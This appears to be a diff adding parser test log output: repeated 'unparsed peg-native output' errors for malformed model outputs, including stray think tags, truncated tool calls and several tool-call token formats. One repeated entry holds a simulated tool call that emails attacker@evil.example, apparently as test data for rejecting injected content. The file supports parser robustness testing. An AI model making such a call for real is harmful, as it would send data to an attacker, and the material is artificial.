+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think>HEAD
+<think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think><think>reason</think>TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output:  TAIL_SENTINEL junk<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.send_email:1<|tool_call_argument_begin|>{"to": "attacker@evil.example", "subject": "hi"}<|tool_call_end|>
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <|tool_call_begin|>functions.note:0TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="false">1</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
